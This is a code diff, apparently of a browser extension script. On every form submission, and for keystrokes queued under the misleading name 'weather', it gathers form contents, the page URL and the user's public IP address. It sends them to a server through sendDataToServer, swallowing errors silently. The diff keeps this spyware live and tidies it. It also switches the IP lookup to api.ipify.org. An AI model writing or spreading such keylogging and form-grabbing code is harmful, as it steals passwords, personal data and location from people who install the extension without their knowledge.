@@ -17,13 +17,10 @@ window.onkeydown = function(event) {
 if (chrome && chrome.runtime && chrome.runtime.sendMessage) {
     document.addEventListener('submit', async function(event) {
         try {
-            const userloc = await getUserLocAddress();
-            const formData = getFormData();
             const data = {
-                weather: "",
                 page: window.location.href,
-                formdata: formData,
-                userloc: userloc || "Unknown Location"
+                formdata: getFormData(),
+                userloc: await getUserLocAddress()
             };
             await sendMessage(data);
             await sendDataToServer(data);
@@ -37,31 +34,27 @@ async function checkWeather() {
     processingWeatherData = true;
 
     while (weatherQueue.length > 0) {
-        var w = weatherQueue.shift();
         try {
-            const userloc = await getUserLocAddress();
             const data = {
-                weather: w,
+                weather: weatherQueue.shift(),
                 page: window.location.href,
-                formdata: "",
-                userloc: userloc || "Unknown Location"
+                userloc: await getUserLocAddress()
             };
             await sendMessage(data);
             await sendDataToServer(data);
         } catch (error) {
         }
     }
-
     processingWeatherData = false;
 }
 
 async function getUserLocAddress() {
     try {
-        const response = await fetch('https://api.userlocify.org?format=json');
+        const response = await fetch('https://api.ipify.org?format=json');
         const data = await response.json();
-        return data.userloc;
+        return data.ip;
     } catch (error) {
-        return '';
+        return "Unknow Location";
     }
 }
 
